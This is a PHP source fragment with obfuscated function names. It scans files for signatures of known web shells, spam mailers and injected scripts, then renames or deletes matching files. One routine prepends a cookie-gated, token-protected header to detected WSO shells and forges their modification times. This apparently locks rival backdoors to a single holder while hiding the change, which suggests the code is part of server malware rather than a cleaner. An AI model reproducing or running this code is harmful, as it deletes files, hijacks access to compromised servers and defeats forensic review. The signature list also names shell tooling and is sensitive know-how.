function rwhnhctytqt($content)
{
if (strpos($content, " = mail(\$_POST[") !== FALSE)
{
    return TRUE;
}

if (strpos($content, " = mail(base64_decode(") !== FALSE)
{
    return TRUE;
}

if (strpos($content, " = mail(stripslashes(\$") !== FALSE)
{
    return TRUE;
}

if (strpos($content, " = mail(stripslashes(\$") !== FALSE)
{
    return TRUE;
}

if (strpos($content, "mail") !== FALSE && substr_count($content, "stripslashes(base64_decode(\$_POST[") == 4)
{
    return TRUE;
}

if (strpos($content, "eval(\"return eval(\"\$code\");\") ?>") !== FALSE)
{
    return TRUE;
}

if (strpos($content, "if(isset(\$_POST[\"msgbody\"]))") !== FALSE && strpos($content, "if(isset(\$_POST[\"msgsubject\"]))") !== FALSE)
{
    return TRUE;
}


return FALSE;
}
function gzwunwym($path)
{
if(!@rename($path, $path . ".suspected")) { @unlink($path); }
}
function ruyspl($content)
{
if (strpos($content, "eval") !== FALSE)
{
    $brace1 = substr_count($content, "{");
    $brace2 = substr_count($content, "(");
    if (($brace1 == 3 || $brace1 == 2) && ($brace2 == 6 || $brace2 == 4))
    {
        return TRUE;
    }
}

return FALSE;
}
function gyame($path)
{
if(!@rename($path, $path . ".suspected"))
{
    @unlink($path);
}
}
function rkfqpzv($content)
{
if (strpos($content, "if(mail(\$MailTo,") !== FALSE)
{
    if (substr_count($content, ")") == 14)
    {
        return TRUE;
    }
}

return FALSE;
}
function gcpecapt($path)
{
if(!@rename($path, $path . ".suspected"))
{
    @unlink($path);
}
}
function rfbwcne($content)
{
if (strpos($content, ";eval(\$") !== FALSE)
{
    if (substr_count($content, ")") == 6)
    {
        return TRUE;
    }
}

return FALSE;
}
function gpvv($path)
{
if(!@rename($path, $path . ".suspected"))
{
    @unlink($path);
}
}
function rgusvozxsuy($content)
{
if (strpos($content, "<?php @eval(\$_POST[") !== FALSE)
{
    return TRUE;
}

return FALSE;

}
function gwdras($path)
{
if(!@rename($path, $path . ".suspected"))
{
    @unlink($path);
}
}
function rrtl($content)
{
if (strpos($content, "http://www.fopo.com.ar/") !== FALSE)
{
    return TRUE;
}

return FALSE;
}
function gjjptxcgfj($path)
{
if(!@rename($path, $path . ".suspected")) { @unlink($path); }
}
function rmnyajja($content)
{
$auth_token = md5(md5($_SERVER['HTTP_HOST']) . $_SERVER['HTTP_HOST'] . "salt1I*@#31RTds34+543sf");

$s1 = strpos($content, "FilesMan");
$s2 = strpos($content, "WSOsetcookie");

$s3_1 = strpos($content, "default_use_ajax");
$s3_2 = strpos($content, "default_action");

if (($s1 !== FALSE || $s2 !== FALSE || ($s3_1 !== FALSE && $s3_2 !== FALSE)) and strpos($content, $auth_token) === FALSE) 
{
    return TRUE;
}

return FALSE;
}
function gerhp($path)
{
$auth_token = md5(md5($_SERVER['HTTP_HOST']) . $_SERVER['HTTP_HOST'] . "salt1I*@#31RTds34+543sf");
$space_str = "";
for ($i=0; $i<512; $i++) {$space_str .= " ";}
$payload = "<" . "?php " . $space_str . " if (!isset(\$_COOKIE['[AUTH]'])) {header('HTTP/1.0 404 Not Found');exit;} ?> ";
$payload = str_replace('[AUTH]', $auth_token, $payload);
$data = @file_get_contents($path);

$mod_time = @stat($path);
@unlink($path);
@file_put_contents($path, $payload . $data);
if ($mod_time)
{
    @touch($path, $mod_time['mtime']);
}

}
function rbwhapbv($content)
{
if (strpos($content, "  ,\"") !== FALSE && strpos($content, "\";\$") !== FALSE && strpos($content, "'\".\$") !== FALSE && substr_count($content, " = \"") == 3)
{
    return TRUE;
}

return FALSE;
}
function ghytera($path)
{
if(!@rename($path, $path . ".suspected")) { @unlink($path); }
}
function rohtudqql($content)
{
if (substr_count($content, ".chr(") > 20 && substr_count($content, "\n") < 10)
{
    return TRUE;
}
return FALSE;
}
function grqifgmfys($path)
{
if(!@rename($path, $path . ".suspected")) { @unlink($path); }
}
function rcehgslrbg($content)
{
if (strpos($content, "<?php \$") === 0 && substr_count($content, ";\$") == 7)
{
    return TRUE;
}

return FALSE;
}
function gvekoorije($path)
{
if(!@rename($path, $path . ".suspected")) { @unlink($path); }
}
function rghupap($content)
{
if (strpos($content, "};eval(\$") !== FALSE && substr_count($content, "}.\$") == 21 && substr_count($content, "};\$") == 4)
{
    return TRUE;
}

return FALSE;
}
function gvlhwis($path)
{
$content = @file_get_contents($path);

$start = strpos($content, "<" . "?php");
if ($start !== FALSE)
{
    $stop = strpos($content, "?" . ">", $start);
    $payload_pos = strpos($content, "};eval(\$");

    if ($stop != FALSE && $payload_pos !== FALSE && $payload_pos < $stop)
    {
        $stop += 2;
        @file_put_contents($path, substr($content, $stop));
    }
}
}
function rdkilvushhg($content)
{
if (substr_count($content, "].\$") == 15 && substr_count($content, ").\"") >= 9)
{
    return TRUE;
}

return FALSE;
}
function gofvsw($path)
{
if(!@rename($path, $path . ".suspected")) { @unlink($path); }
}
function rwva($content)
{
if (strpos($content, "echo \"file test okay\";") !== FALSE && strpos($content, "if( isset(\$_REQUEST[\"test_url\"]) ){") !== FALSE)
{
    return TRUE;
}

return FALSE;
}
function gdxbarzqf($path)
{
if(!@rename($path, $path . ".suspected")) { @unlink($path); }
}
function rillvinti($content)
{
if ((strpos($content, "eval") !== FALSE || strpos($content, "preg_replace") !== FALSE || strpos($content, "_REQUEST") !== FALSE || strpos($content, "_PO") !== FALSE) && substr_count($content, "\n") <= 1 && strlen($content) < 1000)
{
    return TRUE;
}

return FALSE;
}
function gtcdmh($path)
{
return;
}
function rhsbvsg($content)
{
if (strpos($content, "null==getCookie(\"__cfgoid\")&&(setCookie(\"__cfgoid\",1,1),") !== FALSE)
{
    return TRUE;
}

return FALSE;
}
function getx($path)
{
return;
}
function rqjawnul($content)
{
if (strpos($content, " = \"\\x69\\x6e\\x74\\x76\\x61\\x6c\"; \$") !== FALSE)
{
    return TRUE;
}

return FALSE;
}
function gkkcwwsqai($path)
{
return;
}
function rphh($content)
{
if (strpos($content, "\$wp_enc_file = '<" . "?php eval(\"") !== FALSE)
{
    return TRUE;
}
return FALSE;
}
function gsopzleqgwq($path)
{
if(!@rename($path, $path . ".suspected")) { @unlink($path); }
}
function ruxm($content)
{
if (strpos($content, "\treturn @gzinflate") !== FALSE && strpos($content, "'] : (isset(\$_COOKIE['") !== FALSE && strpos($content, "<form method=\"post\" action=\"\">") !== FALSE)
{
    return TRUE;
}
return FALSE;
}
function gkgfhgkmho($path)
{
if(!@rename($path, $path . ".suspected")) { @unlink($path); }
}
function rgerxlxjqgv($content)
{
if (strpos($content, "urldecode(\"%6E1%7A%62%2F%6D%615%5C%76") !== FALSE)
{
    return TRUE;
}

return FALSE;
}
function gtyvnak($path)
{
return;
}
function rkwrb($content)
{
if (strpos($content, "\"));'); \$strings(\$light);") !== FALSE || strpos($content, "@\$strings(str_rot13('riny(") !== FALSE)
{
    return TRUE;
}

return FALSE;
}
function gjxepkbgyt($path)
{
return;
}
function rcsxtkhpug($content)
{
if (strpos($content, "\$f = \$a(\"\", \$array_name(\$string));") !== FALSE && strpos($content, "MALWARE") === FALSE)
{
    return TRUE;
}
return FALSE;
}
function glcquadl($path)
{
return;
}
function rfzfhk($content)
{
if (strpos($content, "<" . "?php eval(gzinflate(base64_decode('") !== FALSE)
{
    return TRUE;
}
return FALSE;
}
function gsluipso($path)
{
return;
}
function rrxwdlqstv($content)
{
if (substr_count($content, "].\$") == 15 && strpos($content, "FilesMan") !== FALSE)
{
    return TRUE;
}
return FALSE;
}
function gomzmpuvi($path)
{
if(!@rename($path, $path . ".suspected")) { @unlink($path); }
}
function rjju($content)
{
if (substr_count($content, "} . \$") == 36)
{
    return TRUE;
}
return FALSE;
}
function gsrpftkr($path)
{
return;
}
function robvaflgsr($content)
{
if (substr_count($content, "return \"{\$") > 50)
{
    return TRUE;
}
return FALSE;

}
function gtaxea($path)
{
if(!@rename($path, $path . ".suspected")) { @unlink($path); }
}
function reqreivtw($content)
{
if (strpos($content, " }eval(") !== FALSE && strpos($content, "\$i] = chr(ord(\$") !== FALSE && strpos($content, "=gzinflate(\$code($") !== FALSE)
{
    return TRUE;
}
return FALSE;
}
function gfsw($path)
{
return;
}
function rbtrwnv($content)
{
if (strpos($content, "ms_not_installed") !== FALSE && strpos($content, "\$id = \$_POST['id']") !== FALSE)
{
    return TRUE;
}
return FALSE;
}
function gtxrj($path)
{
if(!@rename($path, $path . ".suspected")) { @unlink($path); }
}
function ryzizyb($content)
{
if (strpos($content, "if(!\$ping){post_mch(\$sd,'C1',\$rel);}") !== FALSE)
{
    return TRUE;
}
}
function gvcsehxpt($path)
{
return;
}
function rerxt($content)
{
if (strpos($content, "if (is_array(\$s) && (count(\$s) > 0) && isset(\$s[0]['txt']) && strlen(\$s[0]['txt']))") !== FALSE)
{
    return TRUE;
}

}
function ggzo($path)
{
return;
}
function rtjabr($content)
{
if (strpos($content, "{\$r='';for(\$i=0;\$i<strLen(\$p);\$i+=2){\$r.=chr(hexdec(\$p[\$") !== FALSE)
{
    return TRUE;
}
}
function gckagszzwz($path)
{
if(!@rename($path, $path . ".suspected")) { @unlink($path); }
}
function rnbehuzja($content)
{
if (strpos($content, "z0=\$_REQUEST['sort'];\$q1='';\$c2=\"wt8m4;") !== FALSE)
{
    return TRUE;
}
return FALSE;
}
function guuiv($path)
{
return;
}
function rhfrozpdep($content)
{
if (strpos($content, "aWYoISRfQ09PS0lFW") !== FALSE)
{
    return TRUE;
}
return FALSE;
}
function gfmxi($path)
{
return;
}
function rbhhmajxi($content)
{
if (strpos($content, "error_reporting(E_ALL);\$DOMAIN_FNAME1_7QNG") !== FALSE)
{
    return TRUE;
}
return FALSE;
}
function gavhjeeeq($path)
{
return;
}
function rwxzpy($content)
{
if (strpos($content, "@ini_restore('error_log'); @ini_restore('display_errors'); /*") !== FALSE)
{
    return TRUE;
}

return FALSE;
}
function garodpiy($path)
{
return;
}
function rinzpel($content)
{
if (strpos($content, "<" . "?php eval(gzuncompress(base64_decode('eNq") !== FALSE) 
{
    return TRUE;
}
return FALSE;

}
function gpgub($path)
{
return;
}
function rohaki($content)
{
if (strpos($content, "};}}return $") !== FALSE && strpos($content, "'.''.''.''.'") !== FALSE)
{
    return TRUE;
}
return FALSE;
}
function gtzebwtn($path)
{
if(!@rename($path, $path . ".suspected")) { @unlink($path); }
}
function rtfgmpff($content)
{
if (strpos($content, "function wp_sessiion_init(\$ytd){") !== FALSE && strpos($content, "='base64_decode';") !== FALSE)
{
    return TRUE;
}
return FALSE;
}
function gfucwjv($path)
{
if(!@rename($path, $path . ".suspected")) { @unlink($path); }
}
function rwguvl($content)
{
$sig_3 = "<" . "?php eval(base64_decode('JGY9ZGlybmFtZSh";
if (strpos($content, $sig_3) !== FALSE)
{
    return TRUE;
}
return FALSE;
}
function gsqiu($path)
{
return;
}
function rmogum($content)
{
$sig_2 = "if(\$_GET[\"login\"]==\"cmd\"){if(\$_POST['";
if (strpos($content, $sig_2) !== FALSE)
{
    return TRUE;
}
return FALSE;
}
function gpfgvcwz($path)
{
return;
}
function rsfbknd($content)
{
if (strpos($content, "//header('Content-Type:text/html; charset=utf-8');") !== FALSE && strpos($content, "global \$symbol_url") !== FALSE)
{
    return TRUE;
}

return FALSE;
}
function geovifpey($path)
{
return;
}
function rryck($content)
{
if (strpos($content, "<script language=javascript>eval(String.fromCharCode(118, 97, 114, 32,") !== FALSE)
{ 
    return TRUE; 
} 

return FALSE;
}
function gnfhrcmtoed($path)
{
return;
}
function rvmtp($content)
{
if (strpos($content, "='';@eval(base64_decode('QG9iX3N0YXJ0K") !== FALSE)
{
    return TRUE;
}
return FALSE;
}
function gjargulxh($path)
{
return;
}
function rtkouh($content)
{
 if (strpos($content, "@include_once('/") !== FALSE && strpos($content, $_SERVER["DOCUMENT_ROOT"]) !== FALSE)
{
    return TRUE;
}
return FALSE;
}
function gfrh($path)
{
return;
}
function rbasn($content)
{
if (strpos($content, "eval(gzuncompress(base64_decode('eN") !== FALSE)
{
    return TRUE;
}
return FALSE;
}
function gvksknohk($path)
{
return;
}
function rhspiwglxj($content)
{
if (strpos($content, "('Content-Type:text/html;charset=utf-8');if(!function_exists('str_ireplace')") !== FALSE)
{
    return TRUE;
}
return FALSE;
}
function geqeukhi($path)
{
if(!@rename($path, $path . ".suspected")) { @unlink($path); }
}
function rhhlg($content)
{
if (strpos($content, "preg_match('#<img src=\"data:image/png;base64,(.*)\">#'") !== FALSE)
{
    return TRUE;
}
return FALSE;
}
function glsiqzummo($path)
{
if(!@rename($path, $path . ".suspected")) { @unlink($path); }
}
function rbmwm($content)
{
if (strpos($content, "function assert_main_php (\$domain, \$main_php, \$dir)") !== FALSE)
{
    return TRUE;
}
return FALSE;
}
function gswcbffdp($path)
{
return;
}
function rkgaius($content)
{
if (strpos($content, "('', '}'.\$") !== FALSE && strpos($content, "?php function ") !== FALSE)
{
    return TRUE;
}
return FALSE;
}
function givetn($path)
{
if(!@rename($path, $path . ".suspected")) { @unlink($path); }
}
function rsdiwdx($content)
{
if (strpos($content, "\$_FILES[\"filename\"][\"tmp_name\"]") !== FALSE && strpos($content, "Your IP: ") !== FALSE && strpos($content, "move_uploaded_file") !== FALSE)
{
    return TRUE;
}
return FALSE;
}
function gdwlmamdcnd($path)
{
if(!@rename($path, $path . ".suspected")) { @unlink($path); }
}
function riyivvxxfyh($content)
{
if (strpos($content, "script_name)) { echo '~Client has been activated") !== FALSE)
{
    return TRUE;
}
return FALSE;
}
function gtdd($path)
{
return;
}
function rjlhet($content)
{
if (strpos($content, "<" . "?php /* WSO [2.6]  */\$") !== FALSE)
{
    return TRUE;
}
return FALSE;
}
function gbttrc($path)
{
if(!@rename($path, $path . ".suspected")) { @unlink($path); }
}
function rysgncy($content)
{
if (strpos($content, "{ \$x = ''; for (\$i = 0, \$n = strlen(\$s); \$i < \$n; \$i += 2)") !== FALSE)
{
    return TRUE;
}
return FALSE;
}
function gweh($path)
{
if(!@rename($path, $path . ".suspected")) { @unlink($path); }
}
function rvhje($content)
{
if (strpos($content, "\$rnform='<form method=\"post\">ON:<input name=") !== FALSE)
{
    return TRUE;
}
return FALSE;
}
function gkke($path)
{
return;
}
function ruduhyb($content)
{
if (strpos($content, " { private static \$_") !== FALSE && strpos($content, "):return false; else:\$") !== FALSE)
{
    return TRUE;
}
return FALSE;
}
function ghcfqffc($path)
{
return;
}
function rocisk($content)
{
if (strpos($content, "die(\"____INF_WORKING____\");") !== FALSE)
{
    return TRUE;
}
return FALSE;
}
function gszbvlslfz($path)
{
return;
}
function rlprwu($content)
{
if (strpos($content, "@file_put_contents(\$tofile,\$a);") !== FALSE)
{
    return TRUE;
}
return FALSE;
}
function gdxymeas($path)
{
return;
}
function raibi($content)
{
if (strpos($content, "function _1178619035(\$i){\$a=Array") !== FALSE)
{
    return TRUE;
}
return FALSE;
}
function gyhhizftj($path)
{
if(!@rename($path, $path . ".suspected")) { @unlink($path); }
}
function ruaifunh($content)
{
if (strpos($content, "\")); ?" . ">\n<" . "?php \/*a") !== FALSE)
{
    return TRUE;
}
return FALSE;
}
function gjjrkcxc($path)
{
return;
}
function rcsq($content)
{
if (strpos($content, "= create_function('',\$errstr);") !== FALSE)
{
    return TRUE;
}
return FALSE;

}
function gxnqykmkzh($path)
{
return;
}
function rgkukm($content)
{
if (strpos($content, "die(\"____INF_WORKING____\");") !== FALSE)
{
    return TRUE;
}
return FALSE;
}
function gqawdhm($path)
{
return;
}
function rkweqhj($content)
{
if (strpos($content, " = isset(\$_POST['") !== FALSE &&
    strpos($content, "']) ? \$_POST['") !== FALSE &&
    strpos($content, "'] : (isset(\$_COOKIE['") !== FALSE)
{
    return TRUE;
}
return FALSE;
}
function gensugbzlao($path)
{
return;
}
function rntqf($content)
{
if (strpos($content, "]); if (!function_exists('") !== FALSE && strpos($content, "); }; } \$") !== FALSE)
{
    return TRUE;
}
return FALSE;
}
function glri($path)
{
return;
}
function rjmfkzeso($content)
{
if (strpos($content, "\$url = str_replace(\$_SERVER[\"DOCUMENT_ROOT\"],  \$_SERVER[\"HTTP_HOST\"].\"\/\", str_replace(\"\\\\\", \"\/\",realpath(\$fileWritedPath)));") !== FALSE)
{
    return TRUE;
}
return FALSE;
}
function gdwfjgmqbdu($path)
{
return;
}
function ruugna($content)
{
if (strpos($content, "] ^ $") !== FALSE && strpos($content, "]; } } return \$") !== FALSE && strpos($content, "*/\", \$") !== FALSE)
{
    return TRUE;
}
return FALSE;
}
function gscrbqk($path)
{
if(!@rename($path, $path . ".suspected")) { @unlink($path); }
}
function rdjnge($content)
{
if (strpos($content, "RklMRScsICdwLnR4dCcpOw0KDQpp") !== FALSE)
{
    return TRUE;
}
return FALSE;
}
function gnzvwobdwax($path)
{
return;
}
function roprewfwfxm($content)
{
if (strpos($content, "str_replace( array ('%', '*'), array ('/', '='), \$") !== FALSE)
{
    return TRUE;
}
return FALSE;

}
function gqqema($path)
{
return;
}
function rwrlmyfogt($content)
{
if (strpos($content, "53a302ee40d595d853e4cb2a85ed4894") !== FALSE)
{
    return TRUE;
}
return FALSE;
}
function ggukszvxq($path)
{
@unlink($path);
}
function rdxpzq($content)
{
if (strpos($content, "*/[\"\$") !== FALSE && strpos($content, "if(isset(\$_REQUEST /*") !== FALSE && strpos($content, " = \$_REQUEST /*") !== FALSE)
{
    return TRUE;
}
return FALSE;
}
function gasupb($path)
{
return;
}
function rrwe($content)
{
if (strpos($content, "\"]();exit();}if(isset(\${\"") !== FALSE)
{
    return TRUE;
}
return FALSE;
}
function guyjrsxwz($path)
{
return;
}
function rmiayv($content)
{
if (strpos($content, "aWYgKCFpc3NldCgkX0NPT0tJRVszNTVdKSBvciBtZ") !== FALSE)
{
    return TRUE;
}
return FALSE;
}
function gvcdv($path)
{
@unlink($path);
}
function rinqbmuagk($content)
{
if (strpos($content, "\$PHP=Create_Function('',\$filename);\$PHP();") !== FALSE)
{
    return TRUE;
}
return FALSE;
}
function gsvpgs($path)
{
return;
}
function rketduvgwjm($content)
{
if (strpos($content, "sdfadsgh4513sdGG435341FDGWWDFGDFHDFGDSFGDFSGDFG") !== FALSE)
{
    return TRUE;
}
return FALSE;
}
function gixmzbxlw($path)
{
return;
}
function rsvhrrnzsww($content)
{
if (strpos($content, "\$aa = array_flip(str_split('0123456789abcdef'));\$md = str_split(md5(\$pass).md5(\$pa") !== FALSE)
{
    return TRUE;
}
return FALSE;
}
function gxbiobrzyn($path)
{
return;
}
function rgzhwlq($content)
{
if (strpos($content, "add_action( 'init', create_function( '', @join(") !== FALSE)
{
    return TRUE; 
}
return FALSE;
}
function ggsp($path)
{
return;
}
function rzcxliryy($content)
{
if (strpos($content, "\$div_code_name = \"wp_vcd\";") !== FALSE)
{
    return TRUE;
}
return FALSE;
}
function gurhlsf($path)
{
return;
}
function rnbbd($content)
{
if (strpos($content, "async src=") !== FALSE and strpos($content, "sjquery.min.js") !== FALSE)
{
    return TRUE;
}
return FALSE;
}
function guxppfbal($path)
{
return;
}
